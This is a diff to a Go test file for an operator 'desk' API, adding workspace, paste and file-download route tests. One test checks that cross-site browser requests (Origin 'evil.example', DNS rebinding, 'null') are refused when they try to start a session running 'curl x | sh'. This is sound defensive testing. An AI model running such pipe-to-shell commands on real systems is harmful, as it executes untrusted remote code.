@@ -4,6 +4,8 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"io"
+	"net"
 	"net/http"
 	"net/http/httptest"
 	"os"
@@ -62,6 +64,59 @@ func (d *fakeDesk) End(_ context.Context, name string) error {
 	return nil
 }
 
+func (d *fakeDesk) Changes(_ context.Context, since string, wait time.Duration) (fleetapi.DeskList, error) {
+	d.record("changes %s %s", since, wait)
+	return fleetapi.DeskList{Host: "kali", Version: "v2", Workspaces: []fleetapi.DeskWorkspace{{ID: "main", Name: "Main", Layout: "tabs"}},
+		Sessions: []fleetapi.DeskSession{{Name: "api", Workspace: "main", Running: true, Status: fleetapi.StatusIdle}}}, nil
+}
+
+func (d *fakeDesk) Update(_ context.Context, name string, u fleetapi.DeskUpdate) (fleetapi.DeskSession, error) {
+	b, _ := json.Marshal(u)
+	d.record("update %s %s", name, b)
+	if name != "api" {
+		return fleetapi.DeskSession{}, fmt.Errorf("%w %q", desk.ErrNoSession, name)
+	}
+	return fleetapi.DeskSession{Name: name}, nil
+}
+
+func (d *fakeDesk) CreateWorkspace(_ context.Context, c fleetapi.DeskWorkspaceCreate) (fleetapi.DeskWorkspace, error) {
+	d.record("workspace %s %s", c.Name, c.Layout)
+	if c.Layout == "spiral" {
+		return fleetapi.DeskWorkspace{}, fmt.Errorf("layout spiral: %w", desk.ErrInvalid)
+	}
+	return fleetapi.DeskWorkspace{ID: "w1", Name: c.Name, Layout: c.Layout}, nil
+}
+
+func (d *fakeDesk) UpdateWorkspace(_ context.Context, id string, u fleetapi.DeskWorkspaceUpdate) (fleetapi.DeskWorkspace, error) {
+	b, _ := json.Marshal(u)
+	d.record("workspace-update %s %s", id, b)
+	return fleetapi.DeskWorkspace{ID: id}, nil
+}
+
+func (d *fakeDesk) DeleteWorkspace(_ context.Context, id string, end bool) error {
+	d.record("workspace-delete %s %v", id, end)
+	if id == "busy" && !end {
+		return fmt.Errorf("%w: busy has 2 sessions", desk.ErrNotEmpty)
+	}
+	return nil
+}
+
+func (d *fakeDesk) Paste(_ context.Context, session, file string, tarred bool, body io.Reader) (fleetapi.DeskPasted, error) {
+	b, _ := io.ReadAll(body)
+	d.record("paste %s %s %v %q", session, file, tarred, b)
+	return fleetapi.DeskPasted{Path: "/home/op/.paste/" + file, Size: int64(len(b))}, nil
+}
+
+func (d *fakeDesk) File(path string) (*os.File, os.FileInfo, error) {
+	d.record("file %s", path)
+	f, err := os.Open(path)
+	if err != nil {
+		return nil, nil, fmt.Errorf("%w: no file", desk.ErrNoSession)
+	}
+	fi, _ := f.Stat()
+	return f, fi, nil
+}
+
 func (d *fakeDesk) Dirs(prefix string) []string {
 	d.record("dirs %s", prefix)
 	return []string{"/home/op/code"}
@@ -87,6 +142,12 @@ func TestTheDeskIsTheOperatorsAlone(t *testing.T) {
 		{"POST", "/v1/desk", `{"dir":"/home/op/code"}`},
 		{"DELETE", "/v1/desk/api", ""},
 		{"GET", "/v1/desk/dirs?prefix=~/co", ""},
+		{"GET", "/v1/desk?since=v1&wait=1", ""},
+		{"PATCH", "/v1/desk/api", `{"label":"API"}`},
+		{"POST", "/v1/desk/workspaces", `{"name":"Web"}`},
+		{"PATCH", "/v1/desk/workspaces/main", `{"layout":"grid"}`},
+		{"DELETE", "/v1/desk/workspaces/w1", ""},
+		{"POST", "/v1/desk/paste?session=api&file=shot.png", "PNG"},
 	}
 	for _, r := range routes {
 		for tok, want := range map[string]int{"relay": 403, "console": 403, "": 401} {
@@ -145,6 +206,75 @@ func TestTheDesksRoutes(t *testing.T) {
 	want := []string{"list 500", "create x /home/op/code claude --model opus", "create  /nowhere ", "end nope", "dirs ~/co"}
 	if got := d.asked(); !slices.Equal(got, want) {
 		t.Fatalf("asked %q, want %q", got, want)
+	}
+}
+
+// The window's routes: the long poll, workspaces, moves, pastes and
+// downloads, each answering the desk's errors as the API does.
+func TestTheDesksWorkspaceAndPasteRoutes(t *testing.T) {
+	d, api, _ := deskSetup(t)
+	rec := do(t, api, "GET", "/v1/desk?since=abc&wait=999", "full", "")
+	var l fleetapi.DeskList
+	if rec.Code != 200 || json.Unmarshal(rec.Body.Bytes(), &l) != nil || l.Version != "v2" || len(l.Workspaces) != 1 || l.Sessions[0].Workspace != "main" {
+		t.Fatalf("long poll: %d %s", rec.Code, rec.Body)
+	}
+	file := filepath.Join(t.TempDir(), "report.txt")
+	os.WriteFile(file, []byte("hello"), 0o600)
+	for _, c := range []struct {
+		method, path, body string
+		want               int
+	}{
+		{"PATCH", "/v1/desk/api", `{"workspace":"w1","before":""}`, 200},
+		{"PATCH", "/v1/desk/nope", `{"label":"x"}`, 404},
+		{"POST", "/v1/desk/workspaces", `{"name":"Web","layout":"spiral"}`, 400},
+		{"DELETE", "/v1/desk/workspaces/busy", "", 409},
+		{"DELETE", "/v1/desk/workspaces/busy?end=1", "", 200},
+		{"POST", "/v1/desk/paste?session=api&file=a.tgz&kind=tar", "TAR", 200},
+		{"POST", "/v1/desk/paste?session=api", "x", 400},
+		{"POST", "/v1/desk/paste?session=api&file=x&kind=zip", "x", 400},
+		{"GET", "/v1/desk/file?path=/nowhere/x", "", 404},
+	} {
+		if rec := do(t, api, c.method, c.path, "full", c.body); rec.Code != c.want {
+			t.Errorf("%s %s %s: %d %s, want %d", c.method, c.path, c.body, rec.Code, rec.Body, c.want)
+		}
+	}
+	rec = do(t, api, "GET", "/v1/desk/file?path="+file, "full", "")
+	if rec.Code != 200 || rec.Body.String() != "hello" || !strings.Contains(rec.Header().Get("Content-Disposition"), `filename=report.txt`) {
+		t.Fatalf("download: %d %q %v", rec.Code, rec.Body, rec.Header())
+	}
+	want := []string{"changes abc 50s", `update api {"workspace":"w1","before":""}`, `update nope {"label":"x"}`, "workspace Web spiral",
+		"workspace-delete busy false", "workspace-delete busy true", `paste api a.tgz true "TAR"`, "file /nowhere/x", "file " + file}
+	if got := d.asked(); !slices.Equal(got, want) {
+		t.Fatalf("asked %q, want %q", got, want)
+	}
+}
+
+// A page in the operator's browser reaches fleetd as them (the tailnet
+// names the device, not the program): any request a browser marks as a
+// page's is refused before it reaches anything.
+func TestAWebPageCannotActAsTheOperator(t *testing.T) {
+	d, _, tn := deskSetup(t)
+	for _, h := range []map[string]string{
+		{"Origin": "https://evil.example"},
+		{"Origin": "http://100.64.0.1:7878"}, // a page rebound to fleetd's own address
+		{"Origin": "null"},
+		{"Sec-Fetch-Site": "cross-site"},
+		{"Sec-Fetch-Site": "same-origin"},
+	} {
+		req := httptest.NewRequest("POST", "/v1/desk", strings.NewReader(`{"dir":"/tmp","command":"curl x | sh"}`))
+		req.RemoteAddr = net.JoinHostPort(opIP, "40001")
+		req.Host = "100.64.0.1:7878"
+		for k, v := range h {
+			req.Header.Set(k, v)
+		}
+		rec := httptest.NewRecorder()
+		tn.ServeHTTP(rec, req)
+		if rec.Code != 403 {
+			t.Errorf("%v: %d %s, want 403", h, rec.Code, rec.Body)
+		}
+	}
+	if c := d.asked(); len(c) != 0 {
+		t.Fatalf("a page's request reached the desk: %v", c)
 	}
 }
 
